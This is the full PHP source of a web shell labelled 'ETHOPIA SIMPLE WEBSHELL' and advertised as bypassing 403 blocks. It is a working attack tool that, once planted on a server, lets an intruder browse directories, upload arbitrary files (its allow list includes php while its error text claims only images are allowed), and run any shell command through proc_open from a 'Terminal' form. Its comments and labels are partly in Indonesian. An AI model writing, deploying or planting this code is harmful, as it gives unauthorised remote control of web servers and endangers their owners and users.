<?php
function path() {
    if (isset($_GET['dir'])) {
        $dir = str_replace("\\", "/", $_GET['dir']);
        @chdir($dir);
    } else {
        $dir = str_replace("\\", "/", getcwd());
    }
    return $dir;
}
function serverinfo(){
    $output[] = "Current Dir (".writeable(path(), perms(path())).") ";

	print "<pre>";
	print implode("<br>", $output);
	pwd();
	print "</pre>";

}
function pwd() {
	$dir = explode("/", path());
	foreach($dir as $key => $index) {
		print "<a href='?dir=";
		for($i = 0; $i <= $key; $i++) {
			print $dir[$i];
			if($i != $key) {
			print "/";
			}
		}
		print "'>$index</a>/";
	}
	print "<br>";
}
function writeable($path, $perms) {
	return (!is_writable($path)) ? color(1, 1, $perms) : color(1, 2, $perms);
}

function perms($path) {
	$perms = fileperms($path);
	if (($perms & 0xC000) == 0xC000) {
		// Socket
		$info = 's';
	} 
	elseif (($perms & 0xA000) == 0xA000) {
		// Symbolic Link
		$info = 'l';
	} 
	elseif (($perms & 0x8000) == 0x8000) {
		// Regular
		$info = '-';
	} 
	elseif (($perms & 0x6000) == 0x6000) {
		// Block special
		$info = 'b';
	} 
	elseif (($perms & 0x4000) == 0x4000) {
		// Directory
		$info = 'd';
	} 
	elseif (($perms & 0x2000) == 0x2000) {
		// Character special
		$info = 'c';
	} 
	elseif (($perms & 0x1000) == 0x1000) {
		// FIFO pipe
		$info = 'p';
	} 
	else {
		// Unknown
		$info = 'u';
	}
		// Owner
	$info .= (($perms & 0x0100) ? 'r' : '-');
	$info .= (($perms & 0x0080) ? 'w' : '-');
	$info .= (($perms & 0x0040) ?
	(($perms & 0x0800) ? 's' : 'x' ) :
	(($perms & 0x0800) ? 'S' : '-'));
	// Group
	$info .= (($perms & 0x0020) ? 'r' : '-');
	$info .= (($perms & 0x0010) ? 'w' : '-');
	$info .= (($perms & 0x0008) ?
	(($perms & 0x0400) ? 's' : 'x' ) :
	(($perms & 0x0400) ? 'S' : '-'));
	// World
	$info .= (($perms & 0x0004) ? 'r' : '-');
	$info .= (($perms & 0x0002) ? 'w' : '-');
	$info .= (($perms & 0x0001) ?
	(($perms & 0x0200) ? 't' : 'x' ) :
	(($perms & 0x0200) ? 'T' : '-'));

	return $info;
}

function color($bold = 1, $colorid = null, $string = null) {
		$color = array(
			"</font>",  			# 0 off
			"<font color='red'>",	# 1 red 
			"<font color='lime'>",	# 2 lime
			"<font color='white'>",	# 3 white
			"<font color='gold'>",	# 4 gold
		);

	return ($string !== null) ? $color[$colorid].$string.$color[0]: $color[$colorid];
}

if (isset($_POST['upload'])) {
    $errors = array();

    // Validasi jenis file
    $allowed_extensions = array("jpg", "jpeg", "png", "gif","php" ,"xml", "html", "txt");
    $file_ext = strtolower(end(explode('.', $_FILES['file']['name'])));
    if (!in_array($file_ext, $allowed_extensions)) {
        $errors[] = "Hanya file gambar yang diizinkan (jpg, jpeg, png, gif).";
    }
    if (empty($errors)) {
        if (@copy($_FILES['file']['tmp_name'], path() . DIRECTORY_SEPARATOR . $_FILES['file']['name'])) {
            $act = color(1, 2, "Uploaded!") . " at <i><b>" . path() . DIRECTORY_SEPARATOR . $_FILES['file']['name'] . "</b></i>";
        } else {
            $act = color(1, 1, "Failed to upload file!");
        }
    } else {
        $act = implode('<br>', $errors);
    }
}
if (isset($_POST['submit'])) {
    $cmd = $_POST['cmd'];
    $dir = path(); 
    $cmd_with_dir = "cd \"$dir\" && $cmd"; 

    $descriptorspec = array(
        0 => array("pipe", "r"), // stdin
        1 => array("pipe", "w"), // stdout
        2 => array("pipe", "w")  // stderr
    );

    $process = proc_open($cmd_with_dir, $descriptorspec, $pipes);

    if (is_resource($process)) {
        $stdout = stream_get_contents($pipes[1]);
        $stderr = stream_get_contents($pipes[2]);
        fclose($pipes[0]);
        fclose($pipes[1]);
        fclose($pipes[2]);
        proc_close($process);
        $output = empty($stderr) ? $stdout : "Error: $stderr";
    } else {
        $output = "Failed to execute command";
    }
}

?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ETHOPIA SIMPLE WEBSHELL</title>
    <link rel="shortcut icon" href="https://i.ibb.co/TLbgmgG/logo-header.jpg" type="image/x-icon">
    <meta name="description" content="BYPASS 403 LIETSPEED">
    <meta name="og:description" content="BYPASS 403 LIETSPEED">
    <meta name="title" content="ETHOPIA | SIMPLE WEBSHELL">
    <meta name="og:title" content="ETHOPIA | SIMPLE WEBSHELL">
    <meta name="theme-color" content="#000000">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Poetsen+One&display=swap" rel="stylesheet">
    <style>
    * {
        padding: 0;
        margin: 0;
        box-sizing: border-box;
        font-family: "Poetsen One", sans-serif;
    }

    body {
        background-color: black;
        justify-content: center;
        align-items: center;
        text-align: center;
    }

    img {
        width: 25%;
        height: 25%;
    }

    #cmd {
        border: 1.5px solid lime;
        border-radius: 5px;
        background-color: transparent;
        color: whitesmoke;
        padding: 0.2rem 0.2rem;
        width: 20%;
        font-size: 1.2rem;
    }

    #run {
        border-radius: 5px;
        border: 1.5px solid lime;
        background-color: transparent;
        color: whitesmoke;
        padding: 0.2rem 0.2rem;
        cursor: pointer;
        font-size: 1.2rem;
    }

    textarea {
        border: 1.5px solid lime;
        border-radius: 5px;
        background-color: transparent;
        color: whitesmoke;
        width: 100%;
        height: 100%;
        font-size: 1rem;
        margin-top: 1.2rem;
    }

    h2 {
        color: aqua;
    }

    b {
        color: lime;
        font-size: 1.2rem;
    }
    </style>
</head>

<body>
    <img src="https://i.ibb.co/KzStJrN/20240321-181338.png" alt="PJP">
    <form action="" method="POST" enctype="multipart/form-data"
        style="font-size: medium;color: white;margin-top: 10px;">
        <b>ETHOPIA SIMPLE WEBSHELL</b><br>
        <?php if (isset($act)) echo $act; ?><br>
        <?php serverinfo();?>
        <input type="hidden" name="upload" value="1">
        <input type="file" name="file" style="border: 1.5px solid lime;border-radius: 5px;" />
        <input type="submit"
            style="border: 1.5px solid lime;color: white;border-radius: 5px;background: transparent;padding: 3px;cursor: pointer;" />

    </form>
    <h2>Terminal</h2>
    <form method="POST" action=""><br>
        <input type="text" id="cmd" name="cmd" required><br><br>
        <input type="hidden" name="dir" value="<?php echo path(); ?>">
        <input type="submit" name="submit" value="Jalankan Perintah" id="run">
    </form>
    <?php if (isset($output)) : ?>
    <textarea rows="10" cols="50" readonly><?php echo $output; ?></textarea>
    <?php endif; ?>
</body>

</html>
